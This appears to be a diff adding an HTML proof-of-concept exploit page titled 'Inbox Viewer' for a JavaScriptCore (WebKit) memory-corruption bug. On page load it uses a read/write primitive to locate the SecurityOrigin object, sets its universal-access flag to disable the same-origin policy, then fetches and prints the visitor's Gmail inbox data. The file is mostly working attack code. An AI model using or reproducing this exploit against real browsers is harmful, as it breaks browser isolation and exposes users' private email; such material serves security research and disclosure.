@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      font-family: monospace;
+    }
+  </style>
+
+  <script src="utils.js"></script>
+  <script src="int64.js"></script>
+  <script src="pwn.js"></script>
+
+  <script>
+    function print(msg) {
+        document.body.innerText += msg + '\n';
+    }
+
+    // Disables the same-origin policy for this renderer process and subsequently
+    // fetches and displays the users gmail inbox if a gmail session exists.
+    function fetchMail() {
+        if (!isVulnerable()) {
+            print("[-] JSC version not vulnerable. Aborting");
+            return;
+        }
+
+        // Setup the memory read/write primitive.
+        pwn();
+
+        var jsxhr = new XMLHttpRequest();
+
+        var jsxhrAddr = addrof(jsxhr);
+        print("[*] JSXMLHttpRequest instance @ " + jsxhrAddr.toString());
+
+        var xhrAddr = memory.readInt64(Add(jsxhrAddr, 0x20));
+        print("[*] XMLHttpRequest instance @ " + xhrAddr.toString());
+
+        var scriptExecContextAddr = memory.readInt64(Add(xhrAddr, 0x60));
+        print("[*] ScriptExecutionContext instance @ " + scriptExecContextAddr.toString());
+
+        var securityOriginPolicyAddr = memory.readInt64(Add(scriptExecContextAddr, 0x10));
+        print("[*] SecurityOriginPolicy instance @ " + securityOriginPolicyAddr.toString());
+
+        var securityOriginAddr = memory.readInt64(Add(securityOriginPolicyAddr, 8));
+        print("[*] SecurityOrigin instance @ " + securityOriginAddr.toString());
+
+        // So there's this boolean called m_universalAccess.. ;)
+        memory.write(Add(securityOriginAddr, 0x2b), [1]);
+
+        print('------------------------------');
+
+        jsxhr.open('GET', 'https://mail.google.com/mail/u/0/#inbox', false);
+        jsxhr.send();
+
+        var response = jsxhr.responseText;
+        var startIndex = response.indexOf('var VIEW_DATA=');
+        var endIndex = response.indexOf('</scri', startIndex);
+        if (startIndex === -1 || endIndex === -1) {
+            print("Failed to extract data :(");
+            print(response);
+        }
+
+        var content = response.slice(startIndex, endIndex);
+        print("Not gonna parse the Gmail response, find your inbox in the dump...");
+        print(content);
+    }
+
+    window.onload = fetchMail;
+  </script>
+
+  <title>Inbox Viewer</title>
+</head>
+<body>
+</body>
+</html>
